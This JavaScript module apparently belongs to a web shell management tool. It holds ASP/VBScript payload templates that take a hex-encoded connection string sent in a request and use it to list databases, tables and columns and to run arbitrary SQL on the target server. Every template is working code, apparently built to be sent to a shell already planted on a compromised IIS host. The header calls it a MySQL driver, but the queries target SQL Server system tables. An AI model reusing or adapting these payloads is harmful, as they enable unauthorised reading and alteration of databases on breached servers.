//
// ASP::mysql数据库驱动代码模板
//

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _: `Set Conn=Server.CreateObject("Adodb.connection"):
      Dim SI:
      Conn.Open bd(Request("${arg1}")):
      If Err Then:
        SI="ERROR:// "&Err.Description:
        Err.Clear:
      Else:
        Set Rs=CreateObject("Adodb.Recordset"):
        Rs.open "select [name] from master.dbo.sysdatabases order by 1",Conn,1,1:
        If Err Then:
          SI="ERROR:// "&Err.Description:
          Err.Clear:
        Else:
          Do While Not(Rs.Eof Or Rs.Bof):
            SI=SI&Rs(0)&chr(9):
            Rs.MoveNext:
          Loop:
          Rs.Close:
        End If:
        Set Rs=Nothing:
        Conn.Close:
      End If:
      Set Conn=Nothing:
      Response.Write(SI):`.replace(/\n\s+/g, ''),
    [arg1]: '#{hex::conn}'
  },
  // 显示数据库所有表
  show_tables: {
    _: `Set Conn=Server.CreateObject("Adodb.connection"):
      Dim SI:
      Conn.Open ""&bd(Request("${arg1}"))&"":
      If Err Then:
        SI="ERROR:// "&Err.Description:
        Err.Clear:
      Else:
        Set Rs=Conn.Execute("USE ["&Request("${arg2}")&"];SELECT [name] FROM sysobjects WHERE (xtype=\'U\') ORDER BY 1"):
        If Err Then:
          SI="ERROR:// "&Err.Description:
          Err.Clear:
        Else:
          Do While Not(Rs.Eof Or Rs.Bof):
            SI=SI&Rs(0)&chr(9):
            Rs.MoveNext:
          Loop:
        End If:
        Set Rs=Nothing:
        Conn.Close:
      End If:
      Set Conn=Nothing:
      Response.Write(SI):`.replace(/\n\s+/g, ''),
    [arg1]: '#{hex::conn}',
    [arg2]: '#{dbname}'
  },
  // 显示表字段
  show_columns: {
    _: `Set Conn=Server.CreateObject("Adodb.connection"):
      Dim SI:
      Conn.Open ""&bd(Request("${arg1}"))&"":
      If Err Then:
        SI="ERROR:// "&Err.Description:
        Err.Clear:
      Else:
        Set Rs=CreateObject("Adodb.Recordset"):
        Rs.open ""&bd(Request("${arg2}"))&"",Conn,1,1:
        If Err Then:
          SI="ERROR:// "&Err.Description:
          Err.Clear:
        Else:
          For n=0 To Rs.Fields.Count-1:
            SI=SI&Rs.Fields.Item(n).Name&chr(9):
          Next:
          Rs.Close:
        End If:
        Set Rs=Nothing:
        Conn.Close:
      End If:
      Set Conn=Nothing:
      Response.Write(SI):`.replace(/\n\s+/g, ''),
    [arg1]: '#{hex::conn}',
    [arg2]: '#{hex::table}'
  },
  // 执行SQL语句
  query: {
    _: `Set Conn=Server.CreateObject("Adodb.connection"):
      Conn.Open ""&bd(Request("${arg1}"))&"":
      Conn.DefaultDatabase=""&Request("${arg3}")&"":
      Dim CO,HD,RN:
      CO=chr(9)&chr(124)&chr(9):
      RN=chr(13)&chr(10):
      HD="Result"&CO&RN:
      If Err Then:
        Response.Write HD&Err.Description&CO&RN:
        Err.Clear:
      Else:
        Set Rs=Conn.Execute(""&bd(Request("${arg2}"))&""):
        If Err Then:
          Response.Write HD&Err.Number&":"&Err.Description&CO&RN:
          Err.Clear:
        Else:
          Dim FN:
          FN=Rs.Fields.Count-1:
          If FN=-1 Then:
            Response.Write HD&"Execute Successfully!"&CO&RN:
          Else:
            For n=0 To FN:
              Response.Write Rs.Fields.Item(n).Name&CO:
            Next:
            Response.Write RN:
            Do While Not(Rs.Eof Or Rs.Bof):
              For n=0 To FN:
                Response.Write Rs(n):
                Response.Write CO:
              Next:
              Response.Write RN:
              Rs.MoveNext:
            Loop:
          End If:
        End If:
        Set Rs=Nothing:
        Conn.Close:
      End If:
      Set Conn=Nothing:`.replace(/\n\s+/g, ''),
    [arg1]: '#{hex::conn}',
    [arg2]: '#{hex::sql}',
    [arg3]: '#{dbname}'
  }
})